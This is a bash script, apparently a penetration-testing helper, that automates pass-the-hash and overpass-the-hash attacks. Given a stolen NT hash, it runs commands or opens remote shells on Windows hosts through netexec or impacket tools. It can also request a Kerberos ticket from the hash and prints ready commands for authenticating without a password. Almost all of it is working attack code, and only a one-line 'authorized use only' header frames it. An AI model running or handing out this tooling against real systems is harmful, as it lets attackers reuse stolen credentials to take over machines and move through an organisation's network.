#!/usr/bin/env bash
#
# pth.sh - pass-the-hash / overpass-the-hash exec helper
# -----------------------------------------------------------------------------
# Turns a recovered NT hash into action without ever cracking it:
#   exec    : run a command / get a shell on a host using the NT hash
#             (netexec -x, or impacket psexec/wmiexec/smbexec).
#   overpass: "overpass-the-hash" - request a Kerberos TGT from the NT hash
#             (impacket getTGT) and export KRB5CCNAME so subsequent tools auth
#             with Kerberos instead of NTLM (stealthier, needed for some paths).
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: lateral movement on in-scope hosts.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./pth.sh exec     -i <host> -u <user> -H <:nt> [-d dom] [-x "cmd"] [-m psexec|wmiexec|smbexec]
#   ./pth.sh overpass -d <domain> -i <dc_ip> -u <user> -H <:nt>
#
# EXAMPLES:
#   ./pth.sh exec -i 10.10.10.5 -u admin -H :aad3b...:31d6... -x 'whoami /all'
#   ./pth.sh overpass -d corp.local -i 10.10.10.10 -u jdoe -H :31d6...
#       # then: export KRB5CCNAME=jdoe.ccache ; nxc smb dc -k --use-kcache
#
# DEPENDENCIES: netexec and/or impacket (psexec/wmiexec/getTGT)
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
have(){ command -v "$1" >/dev/null 2>&1; }
imp(){ command -v "$1.py" 2>/dev/null || command -v "impacket-$1" 2>/dev/null; }

MODE="${1:-}"; shift || true
HOST="" USER="" HASH="" DOMAIN="" CMD="" METHOD="wmiexec" DC=""
usage(){ sed -n '2,28p' "$0"; exit 1; }
while getopts "i:u:H:d:x:m:h" o; do case "$o" in
  i) HOST=$OPTARG; DC=$OPTARG;; u) USER=$OPTARG;; H) HASH=$OPTARG;; d) DOMAIN=$OPTARG;;
  x) CMD=$OPTARG;; m) METHOD=$OPTARG;; *) usage;;
esac; done
[ "$MODE" = exec ] || [ "$MODE" = overpass ] || usage
[ -z "$USER" ] || [ -z "$HASH" ] && { c_err "need -u and -H"; usage; }

if [ "$MODE" = exec ]; then
  [ -z "$HOST" ] && { c_err "exec needs -i <host>"; usage; }
  NXC=""; for b in nxc netexec crackmapexec; do have "$b" && { NXC=$b; break; }; done
  if [ -n "$NXC" ]; then
    A=( smb "$HOST" -u "$USER" -H "$HASH" ); [ -n "$DOMAIN" ] && A+=( -d "$DOMAIN" )
    if [ -n "$CMD" ]; then c_ok "netexec exec on $HOST: $CMD"; exec "$NXC" "${A[@]}" -x "$CMD"
    else c_ok "netexec auth check (add -x 'cmd' to run something)"; exec "$NXC" "${A[@]}"; fi
  fi
  TOOL=$(imp "$METHOD"); [ -z "$TOOL" ] && { c_err "no netexec and no impacket-$METHOD"; exit 1; }
  TGT="${DOMAIN:+$DOMAIN/}$USER@$HOST"
  c_ok "impacket $METHOD pass-the-hash to $HOST"
  exec "$TOOL" -hashes "$HASH" "$TGT" ${CMD:+"$CMD"}
fi

if [ "$MODE" = overpass ]; then
  [ -z "$DOMAIN" ] || [ -z "$DC" ] && { c_err "overpass needs -d <domain> and -i <dc_ip>"; usage; }
  GT=$(imp getTGT); [ -z "$GT" ] && { c_err "impacket-getTGT not found"; exit 1; }
  c_ok "Requesting TGT for $USER via NT hash (overpass-the-hash)..."
  "$GT" -hashes "$HASH" -dc-ip "$DC" "$DOMAIN/$USER" || { c_err "getTGT failed"; exit 1; }
  CC="$USER.ccache"
  c_ok "TGT cached -> $CC"
  c_info "Use it:"
  echo "   export KRB5CCNAME=$PWD/$CC"
  echo "   nxc smb <dc> -u $USER -k --use-kcache     # Kerberos auth, no password"
  echo "   impacket-psexec -k -no-pass $DOMAIN/$USER@<host-fqdn>"
fi
